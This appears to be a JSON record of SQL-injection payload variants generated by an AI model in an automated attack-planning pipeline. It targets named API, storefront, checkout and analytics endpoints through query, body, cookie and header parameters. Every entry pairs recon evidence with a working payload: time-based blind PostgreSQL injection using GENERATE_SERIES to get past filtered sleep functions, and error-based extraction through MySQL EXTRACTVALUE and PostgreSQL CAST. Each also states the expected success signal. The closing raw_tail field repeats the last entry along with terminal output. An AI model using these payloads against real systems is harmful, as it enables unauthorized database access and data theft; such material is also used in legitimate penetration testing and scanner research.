@@ -1,0 +1,68 @@
+{
+ "key": "sqli_1",
+ "model": "opencode/deepseek-v4.1-flash-free",
+ "class": "sqli",
+ "variants": [
+  {
+   "endpoint": "GET /api/v2/telemetry/events",
+   "target_param": "since",
+   "recon_evidence": "Injecting `since=1 AND 5::int=5` returns the same page as `since=1` while `since=1 AND 5::int=6` returns an empty result set, confirming a blind PostgreSQL boolean oracle; `pg_sleep` and `SLEEP` are both rejected and no SQL error text is ever reflected.",
+   "planner_rationale": "Boolean oracle plus PostgreSQL dialect and zero error reflection means the delay must be self-contained inside the WHERE clause without any SLEEP-family function.",
+   "vuln_class": "sqli",
+   "payload": "1 AND 1337=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))",
+   "injection_point": "query",
+   "expected_success_signal": "Boolean-true response body arrives after a reproducible multi-second pause that scales when the series upper bound is enlarged",
+   "confidence": 0.9,
+   "reasoning": "The confirmed `5::int` tautology pins the backend as PostgreSQL, and because SLEEP is filtered out of this build, GENERATE_SERIES(1,5000000) gives a pure-SQL busy-wait whose cost is proportional to row count. Comparing the response time against `since=1` isolates the delay as query-driven rather than network jitter."
+  },
+  {
+   "endpoint": "POST /api/v1/warehouse/stock/search",
+   "target_param": "warehouse_code",
+   "recon_evidence": "The JSON body filter `{\"warehouse_code\":\"2 AND 1=1\"}` returns the full stock list, `{\"warehouse_code\":\"2 AND 1=2\"}` returns none, and a 6-second latency was observed when a nested aggregate subquery was supplied; the DBMS banner in the `/health` endpoint advertises PostgreSQL 13.",
+   "planner_rationale": "Same blind PostgreSQL condition-injection point moves into the JSON body filter, so a stacked-free time-based COUNT over GENERATE_SERIES should confirm and then widen the oracle.",
+   "vuln_class": "sqli",
+   "payload": "1 AND 1337=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))",
+   "injection_point": "body",
+   "expected_success_signal": "The stock search responds successfully after several seconds instead of instantly, with latency growing when the series bound is raised",
+   "confidence": 0.86,
+   "reasoning": "The body filter already behaves as a boolean oracle against a confirmed PostgreSQL 13 backend, so the numeric context accepts the same AND expression verbatim. Replacing the tautology with the GENERATE_SERIES COUNT converts the boolean channel into a timing channel without relying on any error output."
+  },
+  {
+   "endpoint": "GET /storefront/catalog/item",
+   "target_param": "sku",
+   "recon_evidence": "`sku=25'` produces `You have an error in your SQL syntax near ''25'''` echoed in the response body, and a subsequent `sku=25 AND 1=1` versus `sku=25 AND 1=2` pair flips the product result, confirming MySQL string/numeric injection with full error reflection.",
+   "planner_rationale": "Reflected MySQL syntax errors plus a live result flip mean the fastest exfil path is a single-request error-based dump via the XPATH message channel.",
+   "vuln_class": "sqli",
+   "payload": "1 AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~'))",
+   "injection_point": "query",
+   "expected_success_signal": "An `XPATH syntax error: '~<version string>~'` message appears in the item page body",
+   "confidence": 0.88,
+   "reasoning": "The reflected MySQL syntax error tells us the error string is rendered to the client, which is exactly the precondition EXTRACTVALUE needs to smuggle data out of a malformed XPath argument. The `~` delimiters make the leaked version trivially parseable out of the noisy error text."
+  },
+  {
+   "endpoint": "GET /checkout/basket/summary",
+   "target_param": "cart_id",
+   "recon_evidence": "The `cart_id` cookie is used directly in a basket lookup: `cart_id=77'` returns a generic 500 page, while `cart_id=77 AND 1=1` and `cart_id=77 AND 1=2` return different basket totals, but error text is suppressed on this route compared with the item page.",
+   "planner_rationale": "The cookie is injectable and MySQL-flavoured but this handler hides raw errors, so try the XPATH error channel and treat the presence of the error string itself as the signal.",
+   "vuln_class": "sqli",
+   "payload": "1 AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~'))",
+   "injection_point": "cookie",
+   "expected_success_signal": "A 500 response containing `XPATH syntax error` with the `~<version>~` delimiters, where the identical request without EXTRACTVALUE returns the plain error page",
+   "confidence": 0.72,
+   "reasoning": "The AND-based result flip proves MySQL string context injection through the cookie, but because this handler replaces SQL errors with a generic 500 the leak depends on the DBMS error leaking past the application's exception handler. The version-bearing XPATH message is the discriminator against the baseline 500."
+  },
+  {
+   "endpoint": "GET /api/v1/analytics/report",
+   "target_param": "X-Report-Filter",
+   "recon_evidence": "The custom `X-Report-Filter` header is interpolated into a WHERE clause: `X-Report-Filter: region=EU` works, `X-Report-Filter: region=EU\" AND 5::int=5\"` returns the same rows, and the middleware surfaces raw PostgreSQL `invalid input syntax for type numeric` errors from this route.",
+   "planner_rationale": "PostgreSQL backend with numeric cast errors echoed back on this route makes error-based exfiltration via CAST the highest-yield single-request primitive.",
+   "vuln_class": "sqli",
+   "payload": "1 AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC)",
+   "injection_point": "header",
+   "expected_success_signal": "`ERROR: invalid input syntax for type numeric: \"~PostgreSQL ...~\"` returned in the response body",
+   "confidence": 0.8,
+   "reasoning": "The reflected PostgreSQL numeric-cast errors prove the offending literal is echoed verbatim, and the confirmed `5::int` tautology fixes the dialect. Wrapping `version()` in `~` markers inside the CAST guarantees the value appears intact inside the error text for easy extraction."
+  }
+ ],
+ "raw_tail": "returned in the response body\",\n    \"confidence\": 0.8,\n    \"reasoning\": \"The reflected PostgreSQL numeric-cast errors prove the offending literal is echoed verbatim, and the confirmed `5::int` tautology fixes the dialect. Wrapping `version()` in `~` markers inside the CAST guarantees the value appears intact inside the error text for easy extraction.\"\n  }\n]\n\u001b[0m\n> build · deepseek-v4.1-flash-free\n"
+}
